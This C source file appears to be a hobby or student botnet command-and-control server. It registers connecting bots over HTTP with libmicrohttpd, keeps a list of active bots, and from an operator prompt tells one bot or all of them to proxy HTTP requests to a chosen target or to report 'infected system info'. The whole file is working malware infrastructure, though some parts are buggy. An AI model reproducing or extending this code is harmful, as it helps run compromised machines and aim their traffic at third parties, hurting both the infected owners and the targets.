
#include "controller.h"
#define PAGE "<html><head><title>libmicrohttpd demo</title>" \
             "</head><body>libmicrohttpd demo</body></html>"

// BRAINSTORMING

/*
    p1 -> always on, get commands from cli and execute them
    p2 -> alway on, accept connections from bot in order to register themc -> P2_CONN TCP

    p1 and p2 need to access a shared resource (active_bots):
    - p2 write on in -> producer
    - p1 read from it and update its contents -> consumer

    should I create a c1 process (child of p1)  or a p3 process
    that leaves a open UDP connection in order
    to update bots active state?

    active_bots -> Critical section
    botExists, list_botnet , sendCommand -> unsafe for now
*/

// BOT -> Critical section

active_bots *botnet;
struct MHD_Daemon *mhd_daemon;

// ! ########################################################### MAIN ######################################################################################
int main(int argc, char const *argv[])
{

    int pid;

    initializeSemaphores();

    botnet = (active_bots *)malloc(sizeof(active_bots));
    if (botnet == NULL)
    {
        handle_error("Botnet could not be initialized");
    }
    botnet->next = NULL;
    botnet->bot_id = 0;

    pthread_t *threads = (pthread_t *)malloc(2 * sizeof(pthread_t));

    // parent
    if (pthread_create(&threads[0], NULL, parent, NULL) != 0)
    {
        fprintf(stderr, "Can't create a new thread, error %d\n", errno);
        exit(EXIT_FAILURE);
    }
    // child
    if (pthread_create(&threads[1], NULL, child, NULL) != 0)
    {
        fprintf(stderr, "Can't create a new thread, error %d\n", errno);
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < 2; i++)
    {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
// ! ########################################################### PARENT ######################################################################################
void parent(/*int pid*/)
{

    while (1)
    {

        char command[11];
        printf("\nInsert Command : ");

        fflush(stdin);
        char *res;
        if (fgets(command, 10, stdin) == NULL)
        {
            fflush(stdin);
            clearerr(stdin);
            continue;
        }
        else
        {

            if (strcmp(command, LIST) == 0)
            {
                printf("\nListing active bots of current botnet \n");

                list_botnet(1);
            }
            else if (strcmp(command, QUIT) == 0)
            {
                printf("\nStop C&C \n");
                free(botnet);

                ret = closeSemaphores();
                if (ret < 0)
                {
                    handle_error("Failed to close semaphores");
                }

                MHD_stop_daemon(mhd_daemon);

                // kill(pid, SIGKILL);

                exit(EXIT_SUCCESS);
            }
            else if (strcmp(command, "\n") == 0)
            {
            }
            // maybe just one or multiple | statements

            else if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, SYS_INFO) == 0)
            {

                char target_ip[INET_ADDRSTRLEN] = {0};
                char broadcast[3] = {0};

                if (strcmp(command, SYS_INFO) == 0)
                {
                    strncpy(target_ip, SELF, strlen(SELF));
                }
                else
                {
                    getTargetIp(target_ip);
                }

                printf("\n Do you want to send command to all botnet or to a specific bot? [A,s] \n");
                fgets(broadcast, sizeof(char) * 3, stdin);
                fflush(stdin);

                if (strcmp(broadcast, "s\n") != 0)
                {
                    printf("Broadcastring commmand to botnet\n");
                    list_botnet(1);
                    broadcastCommand(command, target_ip);
                }
                else
                {

                    printf("\nChoose bot to which send command ");

                    ret = list_botnet(0);

                    if (ret < 0)
                    {
                        continue;
                    }

                    char bot_id[100];
                    fgets(bot_id, 100, stdin);
                    int bot = atoi(bot_id);

                    if (botExists(bot) < 0)
                    {
                        printf("\nNot a valid bot id ");
                        continue;
                    }
                    else
                    {
                        list_botnet(1);
                        sendCommand(command, bot, target_ip);
                    }
                }
            }
            else
            {
                printf("\nError, command not supported choose one from the following available commands: \n %s \n %s \n %s \n %s ",
                       HTTP_REQ, LIST, SYS_INFO, QUIT);
                continue;
            }
        }
    }
}
// ! ########################################################### CHILD ######################################################################################
void child()
{

    const union MHD_ConnectionInfo *conninfo;

    mhd_daemon = MHD_start_daemon(MHD_USE_THREAD_PER_CONNECTION, 8081, NULL, NULL, &handle_request, NULL, MHD_OPTION_END);
    if (mhd_daemon == NULL)
    {
        fprintf(stderr, "Error starting daemon.n");
        _exit(EXIT_FAILURE);
    }

    struct hostent *host_entry;
    int hostname;
    char host[256];
    char *IP;

    hostname = gethostname(host, sizeof(host));                      // find the host name
    host_entry = gethostbyname(host);                                // find host information
    IP = inet_ntoa(*((struct in_addr *)host_entry->h_addr_list[0])); // Convert into IP string

    printf("\nChild process started. Listening on port %d. with Ip : %s\n", 8081, IP);
    while (1)
    {
        sleep(1);
    }
}

void sendCommand(char *command, int bot_id, char *target_ip)
{

    CURL *curl;

    curl = curl_easy_init();

    if (curl == NULL)
        handle_error("Could not execute command, error initializing curl handle");
    else
    {

        CURLcode res;

        char url[255] = {0};

        char bot_ip[INET_ADDRSTRLEN] = {0};
        long bot_port;

        if (botExists(bot_id) < 0)
        {
            printf("\nBot with id: %d does not exists", bot_id);
            return;
        }

        ret = setBotInfo(&bot_port, bot_ip, bot_id);
        if (ret < 0)
        {
            printf("\nCould not set bot info");
            return;
        }

        printf("Updating bot info\n");
        if (strcmp(target_ip, "self") == 0)
        {
            updateBotInfo(bot_id, bot_ip, command);
        }
        else
        {
            updateBotInfo(bot_id, target_ip, command);
        }

        // * BUILDING REQUEST
        // url = (char *)malloc(sizeof(PROTOCOL) + sizeof(bot_ip) + 1);

        strcpy(url, PROTOCOL);

        strcat(url, bot_ip);

        printf("%s", url);
        curl_easy_setopt(curl, CURLOPT_PORT, bot_port);
        //! for each command you need to update bot info about action and target
        if (strcmp(command, HTTP_REQ) == 0)
        {
            char request[MAX_REQ_SIZE];

            printf("\nInsert request to proxy : ");
            scanf("%s", request);
            char *new_url = (char *)malloc(sizeof(url) + sizeof(request) + sizeof(HTTP_REQ_ENDPOINT));
            memcpy(new_url, url, sizeof(url));
            strcat(new_url, HTTP_REQ_ENDPOINT);
            strcat(new_url, request);
            curl_easy_setopt(curl, CURLOPT_URL, new_url);

            printf("\nSending request:  %s ", new_url);
            free(new_url);
        }

        if (strcmp(command, SYS_INFO) == 0)
        {
            printf("\nRetrieving infected system info");

            strcat(url, "/sys_info");
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        }

        res = curl_easy_perform(curl);

        curl_easy_cleanup(curl);
    }
}

int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                   const char *method, const char *version, const char *upload_data,
                   size_t *upload_data_size, void **con_cls)
{
    const char *msg = "OK";
    struct MHD_Response *response;
    int ret;

    response = MHD_create_response_from_buffer(strlen(msg), (void *)msg, MHD_RESPMEM_PERSISTENT);
    ret = MHD_queue_response(connection, MHD_HTTP_OK, response);

    const char *bot_ip = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_IP);
    const char *bot_port = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_PORT);

    long port = atol(bot_port);
    struct in_addr address;
    inet_pton(AF_INET, bot_ip, &(address));

    if (findBot(address, port) == -1)
    {

        ret = registerBot(bot_ip, bot_port);

        if (ret < 0)
        {
            const char *msg = "NOT OK";
        }
        printf("Bot with ip: %s Connected\n", bot_ip);
    }

    char *endpoint;
    endpoint = strstr(url, "/notify");
    if (endpoint != NULL)
    {

        printf("Bot completed its task... \n");
        printf("Old Botnet: \n");
        list_botnet(1);
        puts("\n");
        int ID = 0;
        getBotID(bot_ip, bot_port, &ID);

        if (ID == -1)
        {
            printf("BOT %s:%s not present in botnet\n", bot_ip, bot_port);
        }
        else
        {
            updateBotInfo(ID, "void", "void");
        }

        endpoint = NULL;
    }

    MHD_destroy_response(response);

    return ret;
}

void broadcastCommand(char *command, char *target_ip)
{

    CURL *curl;

    CURLcode res;

    char url[255] = {0};
    char request[MAX_REQ_SIZE];
    char *new_url;

    char bot_ip[INET_ADDRSTRLEN] = {0};
    long bot_port;

    active_bots *bot = botnet;

    



    if (strcmp(command, HTTP_REQ) == 0)
    {

        printf("\nInsert request to proxy : ");
        scanf("%s", request);

    }

    if (strcmp(command, SYS_INFO) == 0)
    {
        printf("\nRetrieving infected system info");

    }

    active_bots *b_http = botnet;

    while (b_http != NULL)
    {
        curl = curl_easy_init();
        if (curl)
        {
            if (b_http->bot_id == 0)
            {
                b_http = b_http->next;
                continue;
            }

            printf("Updating bot info\n");
            if (strcmp(target_ip, "self") == 0)
            {
                updateBotInfo(b_http->bot_id, bot_ip, command);
            }
            else
            {
                updateBotInfo(b_http->bot_id, target_ip, command);
            }

            ret = setBotInfo(&bot_port, bot_ip, b_http->bot_id);
            if (ret < 0)
            {
                printf("\nCould not set bot info");
                return;
            }

            strcpy(url, PROTOCOL);

            strcat(url, bot_ip);

            if (strcmp(command, SYS_INFO) == 0)
            {
                strcat(url, "/sys_info");
                curl_easy_setopt(curl, CURLOPT_URL, url);
                curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
            }
            else
            {
                new_url = (char *)malloc(sizeof(url) + sizeof(request) + sizeof(HTTP_REQ_ENDPOINT));

                memcpy(new_url, url, sizeof(url));
                strcat(new_url, HTTP_REQ_ENDPOINT);
                strcat(new_url, request);
                curl_easy_setopt(curl, CURLOPT_URL, new_url);
            }

            curl_easy_setopt(curl, CURLOPT_PORT, b_http->port);
            curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1);

            curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 20);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 20);

            res = curl_easy_perform(curl);
            if (res != CURLE_OK)
            {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                curl_easy_cleanup(curl);
            }

            if (strcmp(command, HTTP_REQ) == 0)
                free(new_url);
        }
        b_http = b_http->next;
    }
}